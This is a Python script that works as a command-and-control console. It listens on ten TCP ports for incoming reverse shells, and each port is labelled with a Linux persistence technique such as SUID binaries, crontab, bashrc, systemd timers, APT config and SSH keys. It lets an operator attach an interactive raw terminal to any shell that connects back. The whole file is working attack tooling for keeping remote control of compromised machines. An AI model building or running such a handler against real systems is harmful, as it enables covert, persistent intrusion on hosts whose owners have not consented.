import socket
import threading
import sys
import time
import select

# Config
PORTS = range(4001, 4011) # 4001 to 4010
HOST = '0.0.0.0'

# State
connections = {} # port -> client_socket
status = {p: "Waiting..." for p in PORTS}
active_interaction = None

# Global flag for UI update
ui_dirty = True

def listen_port(port):
    global active_interaction, ui_dirty
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind((HOST, port))
        s.listen(1)
        
        while True:
            conn, addr = s.accept()
            connections[port] = conn
            status[port] = f"Connected ({addr[0]})"
            ui_dirty = True  # Trigger redraw
            
            while True:
                try:
                    if port not in connections:
                         break
                    if active_interaction != port:
                        time.sleep(0.5)
                        continue
                except:
                    break
            
            try: connections[port].close()
            except: pass
            connections.pop(port, None)
            status[port] = "Waiting..."
            ui_dirty = True # Trigger redraw
            
    except Exception as e:
        status[port] = f"Error: {e}"
        ui_dirty = True

def interact(port):
    global active_interaction, ui_dirty
    if port not in connections:
        print(f"[-] No connection on port {port}")
        return

    # Auto-kill other connections
    active_ports = list(connections.keys())
    for p in active_ports:
        if p != port:
            print(f"[*] Auto-killing unused connection on Port {p}...")
            try:
                c = connections[p]
                del connections[p] 
                c.close()
            except:
                pass
    ui_dirty = True

    conn = connections[port]
    print(f"[*] Switching to Interactive Mode on Port {port}...")
    print("[*] Press Ctrl+C to detach (return to menu), Ctrl+D to close shell.")
    
    active_interaction = port
    conn.setblocking(0)
    
    import termios
    import tty
    
    old_tty = termios.tcgetattr(sys.stdin)
    
    try:
        tty.setraw(sys.stdin.fileno())
        
        while True:
            r, w, e = select.select([conn, sys.stdin], [], [])
            
            if conn in r:
                try:
                    data = conn.recv(4096)
                    if not data: break
                    decoded = data.decode(errors='ignore')
                    sys.stdout.write(decoded.replace('\n', '\r\n'))
                    sys.stdout.flush()
                except:
                    break
            
            if sys.stdin in r:
                chunk = sys.stdin.read(1)
                if chunk == '\x03': # Ctrl+C
                    break
                conn.send(chunk.encode())
                
    except Exception as e:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        active_interaction = None
        print(f"\n[*] Detached from Port {port}.")
        ui_dirty = True

def print_status():
    # ANSI Clear Screen
    print("\033[H\033[J", end="") 
    print("="*40)
    print(f"{'Port':<8} | {'Method':<20} | {'Status'}")
    print("-" * 40)
    methods = [
        "SUID Binary", "Crontab", "Bashrc", "If-Up", 
        "Systemd User", "Systemd Timer", "MOTD", 
        "Autostart", "APT Config", "SSH Key"
    ]
    for i, p in enumerate(PORTS):
        m = methods[i] if i < len(methods) else "Unknown"
        s = status.get(p, "Waiting...")
        print(f"{p:<8} | {m:<20} | {s}")
    print("="*40)
    print("Commands: i <port> | kill <port> | quit")
    print("C2> ", end="", flush=True)

def main():
    global ui_dirty
    print("[*] Starting Multi-Port Listener...")
    
    threads = []
    for p in PORTS:
        t = threading.Thread(target=listen_port, args=(p,))
        t.daemon = True
        t.start()
        threads.append(t)
        
    time.sleep(1) 
    
    # Non-blocking Input Loop
    cmd_buffer = ""
    
    while True:
        try:
            # Redraw if status changed
            if ui_dirty:
                print_status()
                # Restore partial command if user was typing
                sys.stdout.write(cmd_buffer)
                sys.stdout.flush()
                ui_dirty = False
            
            # Wait for input with timeout (to allow checking UI updates)
            r, _, _ = select.select([sys.stdin], [], [], 0.5)
            
            if sys.stdin in r:
                char = sys.stdin.read(1)
                if char == '\n':
                    # Process command
                    cmd_line = cmd_buffer.strip()
                    cmd_buffer = ""
                    print() # Newline after enter
                    
                    cmd = cmd_line.split()
                    if not cmd: 
                         ui_dirty = True # Force redraw prompt
                         continue
                         
                    if cmd[0] == 'quit':
                        break
                    
                    if cmd[0] == 'i':
                        if len(cmd) < 2: 
                            ui_dirty = True
                            continue
                        try:
                            p = int(cmd[1])
                            interact(p)
                        except ValueError:
                            print("Invalid port")
                            time.sleep(1)
                            ui_dirty = True
                    
                    if cmd[0] == 'kill':
                        if len(cmd) < 2: 
                             ui_dirty = True
                             continue
                        try:
                            p = int(cmd[1])
                            if p in connections:
                                connections[p].close()
                                del connections[p]
                                print(f"[*] Killed connection on {p}")
                                time.sleep(0.5)
                                ui_dirty = True
                        except: pass
                        ui_dirty = True
                else:
                    # Echo char back
                    cmd_buffer += char
                    sys.stdout.write(char)
                    sys.stdout.flush()

        except KeyboardInterrupt:
            break
            
    print("\n[*] Exiting.")

if __name__ == "__main__":
    main()
